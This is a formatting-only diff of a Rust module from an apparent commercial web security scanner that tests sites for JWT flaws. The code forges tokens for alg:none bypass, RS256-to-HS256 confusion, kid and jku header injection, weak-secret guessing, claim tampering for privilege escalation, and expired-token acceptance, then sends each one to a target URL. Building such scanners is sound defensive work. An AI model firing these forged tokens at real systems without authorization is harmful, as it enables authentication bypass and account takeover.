@@ -1,6 +1,7 @@
 // Copyright (c) 2026 Bountyy Oy. All rights reserved.
 // This software is proprietary and confidential.
 
+use crate::detection_helpers::AppCharacteristics;
 /**
  * Bountyy Oy - JWT Attack Scanner
  * Tests for JWT (JSON Web Token) vulnerabilities and misconfigurations
@@ -8,10 +9,8 @@
  * @copyright 2026 Bountyy Oy
  * @license Proprietary - Enterprise Edition
  */
-
 use crate::http_client::{HttpClient, HttpResponse};
 use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
-use crate::detection_helpers::AppCharacteristics;
 use anyhow::Result;
 use base64::{engine::general_purpose, Engine as _};
 use serde_json::{json, Value};
@@ -91,7 +90,10 @@ impl JwtScanner {
 
         // Test 2: Algorithm confusion (RS256 -> HS256)
         tests_run += 1;
-        if let Some(vuln) = self.test_algorithm_confusion(base_url, &header, &payload).await {
+        if let Some(vuln) = self
+            .test_algorithm_confusion(base_url, &header, &payload)
+            .await
+        {
             vulnerabilities.push(vuln);
         }
 
@@ -115,7 +117,10 @@ impl JwtScanner {
 
         // Test 6: Claim manipulation
         tests_run += 1;
-        if let Some(vuln) = self.test_claim_manipulation(base_url, &header, &payload).await {
+        if let Some(vuln) = self
+            .test_claim_manipulation(base_url, &header, &payload)
+            .await
+        {
             vulnerabilities.push(vuln);
         }
 
@@ -135,7 +140,12 @@ impl JwtScanner {
     }
 
     /// Test alg:none bypass (CVE-2015-2951)
-    async fn test_alg_none(&self, base_url: &str, _header: &str, payload: &str) -> Option<Vulnerability> {
+    async fn test_alg_none(
+        &self,
+        base_url: &str,
+        _header: &str,
+        payload: &str,
+    ) -> Option<Vulnerability> {
         debug!("[JWT] Testing alg:none bypass");
 
         // Create JWT with alg:none
@@ -150,7 +160,8 @@ impl JwtScanner {
         // JWT with alg:none should have empty signature
         let malicious_jwt = format!("{}{}.", header_b64, payload_b64);
 
-        match self.http_client
+        match self
+            .http_client
             .get(&format!("{}?token={}", base_url, malicious_jwt))
             .await
         {
@@ -174,7 +185,12 @@ impl JwtScanner {
     }
 
     /// Test RS256 -> HS256 algorithm confusion
-    async fn test_algorithm_confusion(&self, base_url: &str, header: &str, payload: &str) -> Option<Vulnerability> {
+    async fn test_algorithm_confusion(
+        &self,
+        base_url: &str,
+        header: &str,
+        payload: &str,
+    ) -> Option<Vulnerability> {
         debug!("[JWT] Testing algorithm confusion (RS256->HS256)");
 
         // Try to change RS256 to HS256
@@ -189,7 +205,8 @@ impl JwtScanner {
                 let signature = self.sign_hmac(&format!("{}.{}", header_b64, payload_b64), "");
                 let malicious_jwt = format!("{}.{}.{}", header_b64, payload_b64, signature);
 
-                match self.http_client
+                match self
+                    .http_client
                     .get(&format!("{}?token={}", base_url, malicious_jwt))
                     .await
                 {
@@ -215,7 +232,12 @@ impl JwtScanner {
     }
 
     /// Test kid (Key ID) injection
-    async fn test_kid_injection(&self, base_url: &str, header: &str, payload: &str) -> Option<Vulnerability> {
+    async fn test_kid_injection(
+        &self,
+        base_url: &str,
+        header: &str,
+        payload: &str,
+    ) -> Option<Vulnerability> {
         debug!("[JWT] Testing kid injection");
 
         if let Ok(mut header_json) = serde_json::from_str::<Value>(header) {
@@ -238,7 +260,8 @@ impl JwtScanner {
                 let signature = self.sign_hmac(&format!("{}.{}", header_b64, payload_b64), "");
                 let malicious_jwt = format!("{}.{}.{}", header_b64, payload_b64, signature);
 
-                match self.http_client
+                match self
+                    .http_client
                     .get(&format!("{}?token={}", base_url, malicious_jwt))
                     .await
                 {
@@ -264,7 +287,12 @@ impl JwtScanner {
     }
 
     /// Test jku (JWK Set URL) injection
-    async fn test_jku_injection(&self, base_url: &str, header: &str, payload: &str) -> Option<Vulnerability> {
+    async fn test_jku_injection(
+        &self,
+        base_url: &str,
+        header: &str,
+        payload: &str,
+    ) -> Option<Vulnerability> {
         debug!("[JWT] Testing jku injection");
 
         if let Ok(mut header_json) = serde_json::from_str::<Value>(header) {
@@ -281,10 +309,12 @@ impl JwtScanner {
                 let header_b64 = general_purpose::URL_SAFE_NO_PAD.encode(header_json.to_string());
                 let payload_b64 = general_purpose::URL_SAFE_NO_PAD.encode(payload);
 
-                let signature = self.sign_hmac(&format!("{}.{}", header_b64, payload_b64), "attacker");
+                let signature =
+                    self.sign_hmac(&format!("{}.{}", header_b64, payload_b64), "attacker");
                 let malicious_jwt = format!("{}.{}.{}", header_b64, payload_b64, signature);
 
-                match self.http_client
+                match self
+                    .http_client
                     .get(&format!("{}?token={}", base_url, malicious_jwt))
                     .await
                 {
@@ -310,20 +340,34 @@ impl JwtScanner {
     }
 
     /// Test weak signature
-    async fn test_weak_signature(&self, base_url: &str, header: &str, payload: &str) -> Option<Vulnerability> {
+    async fn test_weak_signature(
+        &self,
+        base_url: &str,
+        header: &str,
+        payload: &str,
+    ) -> Option<Vulnerability> {
         debug!("[JWT] Testing weak signatures");
 
         let header_b64 = general_purpose::URL_SAFE_NO_PAD.encode(header);
         let payload_b64 = general_purpose::URL_SAFE_NO_PAD.encode(payload);
 
         // Try common weak secrets
-        let weak_secrets = vec!["".to_string(), "secret".to_string(), "password".to_string(), "test".to_string(), "key".to_string(), "jwt".to_string(), "token".to_string()];
+        let weak_secrets = vec![
+            "".to_string(),
+            "secret".to_string(),
+            "password".to_string(),
+            "test".to_string(),
+            "key".to_string(),
+            "jwt".to_string(),
+            "token".to_string(),
+        ];
 
         for secret in weak_secrets {
             let signature = self.sign_hmac(&format!("{}.{}", header_b64, payload_b64), &secret);
             let malicious_jwt = format!("{}.{}.{}", header_b64, payload_b64, signature);
 
-            match self.http_client
+            match self
+                .http_client
                 .get(&format!("{}?token={}", base_url, malicious_jwt))
                 .await
             {
@@ -348,7 +392,12 @@ impl JwtScanner {
     }
 
     /// Test claim manipulation
-    async fn test_claim_manipulation(&self, base_url: &str, header: &str, payload: &str) -> Option<Vulnerability> {
+    async fn test_claim_manipulation(
+        &self,
+        base_url: &str,
+        header: &str,
+        payload: &str,
+    ) -> Option<Vulnerability> {
         debug!("[JWT] Testing claim manipulation");
 
         if let Ok(mut payload_json) = serde_json::from_str::<Value>(payload) {
@@ -372,19 +421,28 @@ impl JwtScanner {
                 // Try with no signature
                 let malicious_jwt = format!("{}{}.", header_b64, payload_b64);
 
-                match self.http_client
+                match self
+                    .http_client
                     .get(&format!("{}?token={}", base_url, malicious_jwt))
                     .await
                 {
                     Ok(response) => {
-                        if self.is_authenticated(&response) && self.is_elevated_privileges(&response) {
+                        if self.is_authenticated(&response)
+                            && self.is_elevated_privileges(&response)
+                        {
                             return Some(self.create_vulnerability(
                                 "JWT Claim Manipulation",
                                 &malicious_jwt,
                                 base_url,
-                                &format!("JWT claims not properly verified - {} can be manipulated", claim),
+                                &format!(
+                                    "JWT claims not properly verified - {} can be manipulated",
+                                    claim
+                                ),
                                 Confidence::Medium,
-                                format!("Successfully escalated privileges by setting {}: {}", claim, value),
+                                format!(
+                                    "Successfully escalated privileges by setting {}: {}",
+                                    claim, value
+                                ),
                                 7.5,
                             ));
                         }
@@ -398,7 +456,12 @@ impl JwtScanner {
     }
 
     /// Test expired token acceptance
-    async fn test_expired_token(&self, base_url: &str, header: &str, payload: &str) -> Option<Vulnerability> {
+    async fn test_expired_token(
+        &self,
+        base_url: &str,
+        header: &str,
+        payload: &str,
+    ) -> Option<Vulnerability> {
         debug!("[JWT] Testing expired token acceptance");
 
         if let Ok(mut payload_json) = serde_json::from_str::<Value>(payload) {
@@ -412,7 +475,8 @@ impl JwtScanner {
             let signature = self.sign_hmac(&format!("{}.{}", header_b64, payload_b64), "");
             let malicious_jwt = format!("{}.{}.{}", header_b64, payload_b64, signature);
 
-            match self.http_client
+            match self
+                .http_client
                 .get(&format!("{}?token={}", base_url, malicious_jwt))
                 .await
             {
@@ -444,13 +508,13 @@ impl JwtScanner {
 
     /// Sign with HMAC-SHA256
     fn sign_hmac(&self, data: &str, secret: &str) -> String {
-        use sha2::Sha256;
         use hmac::{Hmac, Mac};
+        use sha2::Sha256;
 
         type HmacSha256 = Hmac<Sha256>;
 
-        let mut mac = HmacSha256::new_from_slice(secret.as_bytes())
-            .expect("HMAC can take key of any size");
+        let mut mac =
+            HmacSha256::new_from_slice(secret.as_bytes()).expect("HMAC can take key of any size");
         mac.update(data.as_bytes());
 
         let result = mac.finalize();
@@ -485,15 +549,19 @@ impl JwtScanner {
         }
 
         // Check for auth tokens/session in response
-        if response.headers.get("set-cookie")
+        if response
+            .headers
+            .get("set-cookie")
             .map(|c| c.contains("session") || c.contains("auth_token"))
-            .unwrap_or(false) {
+            .unwrap_or(false)
+        {
             return true;
         }
 
         // Check for JSON success response (API endpoints)
-        if body_lower.contains("\"authenticated\":true") ||
-           body_lower.contains("\"success\":true") && body_lower.contains("\"token\"") {
+        if body_lower.contains("\"authenticated\":true")
+            || body_lower.contains("\"success\":true") && body_lower.contains("\"token\"")
+        {
             return true;
         }
 
@@ -505,9 +573,9 @@ impl JwtScanner {
 
     /// Check if response indicates elevated privileges
     fn is_elevated_privileges(&self, response: &HttpResponse) -> bool {
-        response.body.to_lowercase().contains("admin") ||
-        response.body.to_lowercase().contains("superuser") ||
-        response.body.to_lowercase().contains("administrator")
+        response.body.to_lowercase().contains("admin")
+            || response.body.to_lowercase().contains("superuser")
+            || response.body.to_lowercase().contains("administrator")
     }
 
     /// Create vulnerability record
@@ -609,7 +677,10 @@ mod tests {
         let signature = scanner.sign_hmac(data, secret);
 
         assert!(!signature.is_empty(), "Signature should not be empty");
-        assert!(signature.len() > 20, "Signature should be reasonable length");
+        assert!(
+            signature.len() > 20,
+            "Signature should be reasonable length"
+        );
     }
 
     #[test]
@@ -623,7 +694,10 @@ mod tests {
             duration_ms: 100,
         };
 
-        assert!(scanner.is_authenticated(&authenticated_response), "Should detect authentication");
+        assert!(
+            scanner.is_authenticated(&authenticated_response),
+            "Should detect authentication"
+        );
 
         let unauthorized_response = HttpResponse {
             status_code: 401,
@@ -632,7 +706,10 @@ mod tests {
             duration_ms: 100,
         };
 
-        assert!(!scanner.is_authenticated(&unauthorized_response), "Should not detect authentication");
+        assert!(
+            !scanner.is_authenticated(&unauthorized_response),
+            "Should not detect authentication"
+        );
     }
 
     #[test]
@@ -646,7 +723,10 @@ mod tests {
             duration_ms: 100,
         };
 
-        assert!(scanner.is_elevated_privileges(&admin_response), "Should detect admin privileges");
+        assert!(
+            scanner.is_elevated_privileges(&admin_response),
+            "Should detect admin privileges"
+        );
 
         let user_response = HttpResponse {
             status_code: 200,
@@ -655,6 +735,9 @@ mod tests {
             duration_ms: 100,
         };
 
-        assert!(!scanner.is_elevated_privileges(&user_response), "Should not detect elevated privileges");
+        assert!(
+            !scanner.is_elevated_privileges(&user_response),
+            "Should not detect elevated privileges"
+        );
     }
 }
